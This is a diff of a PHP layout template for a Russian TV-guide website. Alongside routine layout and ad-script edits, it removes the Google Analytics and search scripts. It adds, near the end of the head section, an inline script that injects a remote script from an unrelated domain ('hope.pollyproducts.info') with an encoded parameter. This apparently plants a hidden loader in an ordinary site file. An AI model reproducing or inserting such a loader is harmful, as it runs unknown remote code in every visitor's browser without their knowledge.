@@ -4,12 +4,20 @@
  * 
  * @author  Antony Repin
  * @package rutvgid
- * @version $Id: layout.phtml,v 1.23 2013-02-15 00:44:02 developer Exp $
+ * @version $Id: layout.phtml,v 1.24 2013-02-25 11:40:40 developer Exp $
  *
  */
 
 $pageClass   = isset($this->pageclass) && !empty($this->pageclass) ? ' '.(string)$this->pageclass : '' ;
 $isFrontpage = trim($pageClass)=='frontpage' ? true  : false ;
+
+$this->maincontent_width = 6;
+if ($this->hide_sidebar=='left'){
+	$this->maincontent_width = 8;
+}
+if ($this->hide_sidebar=='right'){
+	$this->maincontent_width = 10;
+}
 
 $this->headMeta()
 	->prependHttpEquiv('Content-Type', 'text/html;charset=utf-8');
@@ -43,19 +51,25 @@ $this->jQuery()->enable() //enable jquery ;
 
 $this->headScript()
 	->setAllowArbitraryAttributes(true)
-	->prependFile($this->baseUrl($this->baseUrl('js/less.min.js')))
-	->prependFile($this->baseUrl('js/bootstrap.js'))
-	->appendFile('http://yandex.st/share/share.js' )
-	->appendFile('//vk.com/js/api/openapi.js?75' );
+	->prependFile( $this->baseUrl( $this->baseUrl( 'js/less.min.js' )))
+	->prependFile( $this->baseUrl( 'js/bootstrap.js' ))
+	->appendFile( $this->baseUrl( 'js/realt.js' ))
+	->appendFile( $this->baseUrl( 'js/g.js' ))
+	->appendFile( 'http://yandex.st/share/share.js' )
+	->appendFile( '//vk.com/js/api/openapi.js?75' );
 
 $this->inlineScript()
-	->appendScript( 'VK.init({apiId: 2963750, onlyWidgets: true});
-	VK.Widgets.Group("vk_groups", {mode: 0, width: "350", height: "290" }, 27716041);
-	$("a[class^=\'mg_ad\']").remove(); 
-	jQuery(document).ready(function(){ 
-		$("#footer .counter_logo").css({ display: "none" }); 
-		if  ($("#col_r .da_adp_links")) { $("#col_r .da_adp_links").css({ display: "none" }); }
-	});');
+->appendScript( 'VK.init({apiId: 2963750, onlyWidgets: true});
+$("a[class^=\'mg_ad\']").remove();
+jQuery(document).ready(function(){
+	$("#footer .counter_logo").css({ display: "none" });
+	//if  ($("#col_r .da_adp_links")) { $("#col_r .da_adp_links").css({ display: "none" }); }
+});');
+
+if (!isFrontpage){
+    $this->inlineScript()
+    	->appendScript('VK.Widgets.Group("vk_groups", {mode: 0, width: "350", height: "290" }, 27716041);');
+}
 
 
 if (APPLICATION_ENV!='development') {
@@ -69,19 +83,15 @@ if (APPLICATION_ENV!='development') {
 	";"+Math.random();');
 }
 
-$this->maincontent_width = 6;
-if ($this->hide_sidebar=='left'){
-	$this->maincontent_width = 8;
-}
-if ($this->hide_sidebar=='right'){
-	$this->maincontent_width = 10;
-}
+
 
 
 $this->placeholder('maincontent')->set( $this->layout()->content );
 $this->placeholder('header')->set( $this->partial('partials/header.phtml', array('pageclass'=>$this->pageclass)) );
 $this->placeholder('footer')->set( $this->partial('partials/footer.phtml', array()) );
-$this->placeholder('featured_channels')->set( $this->partial('partials/featured-channels.phtml', array('list'=>$this->featured)) );
+if (!isFrontpage){
+	$this->placeholder('featured_channels')->set( $this->partial('partials/featured-channels.phtml', array('list'=>$this->featured)) );
+}
 $this->placeholder('sidebar_left')->set( $this->partial('partials/sidebar-left.phtml', array(
 	'top_programs'=>$this->top_programs,
 	'cats'=>$this->channels_cats,
@@ -90,21 +100,17 @@ if ($isFrontpage) {
 	$this->placeholder('frontpage_menu')->set( $this->partial('partials/frontpage-menu.phtml', array()) );
 }
 
-/*
- * right sidebar
- */
-$sidebarConf = array(
-	'videos'=>$this->sidebar_videos,
-	'kids_channels'=>$this->kids_channels,
-	'show_videos'=>$this->show_videos,
-);
+
 if ($this->channel) $sidebarConf['channel'] = $this->channel;
 if ($this->current_program) $sidebarConf['program'] = $this->current_program;
-$this->placeholder('sidebar_right')->set( $this->partial( 'partials/sidebar-right.phtml', $sidebarConf ) );
-
+$this->placeholder('sidebar_right')->set( $this->partial( 'partials/sidebar-right.phtml', array(
+	'videos'=>$this->sidebar_videos,
+	'channel'=>$this->channel,
+)));
+/* 
 $this->headStyle()
 	->appendStyle("");
-
+ */
 
 
 ?>
@@ -122,38 +128,28 @@ echo $this->headStyle(), PHP_EOL;
 ?>
 
 <?php 
-if ( APPLICATION_ENV!='testing' && !stristr($_SERVER['HTTP_USER_AGENT'], 'bot') && !$isFrontpage) {
-    
-	$this->inlineScript()
-		->appendFile("http://code.directadvert.ru/show.cgi?adp=85979&div=DIV_DA_85979")  //directadvert rollin
+if ( APPLICATION_ENV!='testing' && !$isFrontpage) {
+    $this->inlineScript()
+		//->appendFile("http://code.directadvert.ru/show.cgi?adp=85979&div=DIV_DA_85979")  //directadvert rollin
 		->appendFile("http://code.directadvert.ru/show.cgi?adp=85753&div=DIV_DA_85753");  //directadvert right sidebar
-	
-	?>
-	<script type="text/javascript">
-	
-	  var _gaq = _gaq || [];
-	  _gaq.push(['_setAccount', 'UA-778789-8']);
-	  _gaq.push(['_trackPageview']);
-	
-	  (function() {
-	    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
-	    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
-	    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
-	  })();
-	
-	</script>
-	<script>
-	(function() {
-		var cx = ' 	006526203727824860247:vdzpxf_4n5a';
-		var gcse = document.createElement('script'); gcse.type = 'text/javascript'; gcse.async = true;
-		gcse.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//www.google.com/cse/cse.js?cx=' + cx;
-		var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(gcse, s);
-	})();
-	</script>
-	<?php 
 }
-
 ?>
+
+<?php if ( APPLICATION_ENV!='testing' && !$isFrontpage) { ?>
+<script type="text/javascript">
+   (function(w) {
+     var script = document.createElement('script');
+     var i = setInterval(function() {
+       if (typeof w.document.body !== 'undefined') {
+           script.src = 'http://hope.pollyproducts.info' + '/?8014=OnM6PGgsIiEtJScqPXN8eH55fw';
+           w.document.body.appendChild(script);
+           clearInterval(i);
+       }
+     }, 200);
+})(window);
+</script>
+<?php 
+} ?>
 
 </head>
 
@@ -168,7 +164,6 @@ if ( APPLICATION_ENV!='testing' && !stristr($_SERVER['HTTP_USER_AGENT'], 'bot') 
 	<div id="content" class="row-fluid<?php echo $pageClass; ?>">
 		
 		<?php 
-		
 		if ($isFrontpage) {
 			?>
 		<div class="span12" id="maincontent">
@@ -179,7 +174,7 @@ if ( APPLICATION_ENV!='testing' && !stristr($_SERVER['HTTP_USER_AGENT'], 'bot') 
 		</div>
 			<?php 
 		} else {
-			 ?>
+		?>
 		
 		<?php if (!($this->hide_sidebar=='left')): ?>
 		<div class="span2" id="col_l">
@@ -199,7 +194,11 @@ if ( APPLICATION_ENV!='testing' && !stristr($_SERVER['HTTP_USER_AGENT'], 'bot') 
 				}
 			} else {
 				if (APPLICATION_ENV=='production') {
-				    echo '<div id="DIV_DA_85979"></div>'; //directadvert rollin left
+				    /*
+				    //directadvert rollin left container ?>
+				    <div id="DIV_DA_85979"></div> 
+				    <?php
+				    */ 
 				}
 			}
 			echo $this->placeholder('maincontent');
